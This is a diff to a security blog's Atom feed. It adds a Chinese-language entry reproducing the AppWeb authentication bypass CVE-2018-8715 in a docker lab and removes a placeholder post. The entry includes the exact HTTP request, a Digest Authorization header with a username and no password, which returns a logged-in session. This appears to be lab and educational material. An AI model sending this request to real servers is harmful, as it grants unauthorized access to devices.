@@ -6,7 +6,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="https://s40d1.github.io/"/>
-  <updated>2020-10-17T09:33:52.304Z</updated>
+  <updated>2020-10-18T11:03:45.746Z</updated>
   <id>https://s40d1.github.io/</id>
   
   <author>
@@ -15,6 +15,34 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>AppWeb认证绕过漏洞（CVE-2018-8715）复现</title>
+    <link href="https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89%E5%A4%8D%E7%8E%B0/"/>
+    <id>https://s40d1.github.io/wiki/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/AppWeb%E8%AE%A4%E8%AF%81%E7%BB%95%E8%BF%87%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2018-8715%EF%BC%89%E5%A4%8D%E7%8E%B0/</id>
+    <published>2020-10-18T11:04:22.553Z</published>
+    <updated>2020-10-18T11:03:45.746Z</updated>
+    
+    <content type="html"><![CDATA[<p>[toc]<br>AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Application容器。</p><p>AppWeb可以进行认证配置，其认证方式包括以下三种：</p><ul><li>basic 传统HTTP基础认证</li><li>digest 改进版HTTP基础认证，认证成功后将使用Cookie来保存状态，而不用再传递Authorization头</li><li>form 表单认证<br>其<code>7.0.3</code>之前的版本中，对于digest和form两种认证方式，如果用户传入的密码为null（也就是没有传递密码参数），appweb将因为一个逻辑错误导致直接认证成功，并返回session。</li></ul><h2 id="漏洞环境"><a href="#漏洞环境" class="headerlink" title="漏洞环境"></a>漏洞环境</h2><p>执行如下命令启动一个带有digest认证的Appweb 7.0.1服务器：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">docker-compose up -d</span><br></pre></td></tr></table></figure><p>访问<a href="http://your-ip:8080，可见需要输入账号密码。" rel="external nofollow noopener noreferrer" target="_blank">http://your-ip:8080，可见需要输入账号密码。</a><br><img src="https://note.youdao.com/yws/public/resource/fd68f0a1b7b719c6309b51ca71cde4db/B36AFD475B3A4C6DB2CECEA396EB1B69?ynotemdtimestamp=1603018930875" alt="image"></p><h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>利用该漏洞需要知道一个已存在的用户名，当前环境下用户名为admin。<br>使用admin空密码登录</p><p>构造头<code>Authorization: Digest username=&quot;admin&quot;</code>，并发送如下数据包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">GET &#x2F; HTTP&#x2F;1.1</span><br><span class="line">Host: example.com</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Authorization: Digest username&#x3D;&quot;admin&quot;</span><br></pre></td></tr></table></figure><p>可见，因为我们没有传入密码字段，所以服务端出现错误，直接返回了200，此页面为登录成功页面，且包含一个session：<br><img src="https://note.youdao.com/yws/public/resource/fd68f0a1b7b719c6309b51ca71cde4db/C348E0CE152C4058954D792A178A2801?ynotemdtimestamp=1603018930875" alt="image"><br>认证登录成功：<br><img src="https://note.youdao.com/yws/public/resource/fd68f0a1b7b719c6309b51ca71cde4db/081DDB46750F4D1FA4D6DDED53260E25?ynotemdtimestamp=1603018930875" alt="image"></p>]]></content>
+    
+    <summary type="html">
+    
+      
+      
+        &lt;p&gt;[toc]&lt;br&gt;AppWeb是Embedthis Software LLC公司负责开发维护的一个基于GPL开源协议的嵌入式Web Server。他使用C/C++来编写，能够运行在几乎先进所有流行的操作系统上。当然他最主要的应用场景还是为嵌入式设备提供Web Applica
+      
+    
+    </summary>
+    
+    
+      <category term="渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="Web渗透" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/"/>
+    
+      <category term="漏洞复现" scheme="https://s40d1.github.io/categories/%E6%B8%97%E9%80%8F/Web%E6%B8%97%E9%80%8F/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
+    
+    
+  </entry>
   
   <entry>
     <title>Apereo CAS 4.1 反序列化命令执行漏洞复现</title>
@@ -537,30 +565,6 @@
     
     
       <category term="CTF" scheme="https://s40d1.github.io/categories/CTF/"/>
-    
-    
-  </entry>
-  
-  <entry>
-    <title>article title</title>
-    <link href="https://s40d1.github.io/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/"/>
-    <id>https://s40d1.github.io/wiki/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/%E7%AC%AC%E4%B8%80%E7%AF%87%E6%96%87%E7%AB%A0/</id>
-    <published>2020-06-23T16:13:37.000Z</published>
-    <updated>2020-06-23T16:15:56.000Z</updated>
-    
-    <content type="html"><![CDATA[<h1 id="第一篇文章"><a href="#第一篇文章" class="headerlink" title="第一篇文章"></a>第一篇文章</h1>]]></content>
-    
-    <summary type="html">
-    
-      
-      
-        &lt;h1 id=&quot;第一篇文章&quot;&gt;&lt;a href=&quot;#第一篇文章&quot; class=&quot;headerlink&quot; title=&quot;第一篇文章&quot;&gt;&lt;/a&gt;第一篇文章&lt;/h1&gt;
-      
-    
-    </summary>
-    
-    
-      <category term="代码审计" scheme="https://s40d1.github.io/categories/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
     
     
   </entry>
